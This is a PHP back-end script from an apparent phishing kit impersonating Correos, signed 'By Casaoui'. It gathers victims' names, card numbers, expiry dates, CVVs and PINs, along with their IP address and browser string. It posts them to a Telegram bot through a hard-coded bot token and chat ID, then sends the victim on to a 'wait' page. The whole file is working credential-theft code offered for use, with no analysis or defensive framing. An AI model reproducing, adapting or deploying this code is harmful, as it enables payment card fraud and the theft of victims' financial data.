<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "--++-----[ CVV Correos ]-----++--\n";
$message .= "first name : ".$_POST['fname']."\n";
$message .= "last name : ".$_POST['lname']."\n";
$message .= "card number : ".$_POST['card']."\n";
$message .= "Exp date : ".$_POST['exp']."\n";
$message .= "Cvv : ".$_POST['cvv']."\n";
$message .= "Cvv : ".$_POST['pin']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "==============|| By Casaoui ||==============\n";

$website="https://api.telegram.org/bot791004997:AAHUiihdi5ha9GyEnKFDNMJ_tNYtY3Ps1xo";
$chatId=-353641168;  //Receiver Chat Id 
$params=[
    'chat_id'=>'-353641168',
   'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

header("Location: ../wait/");?>
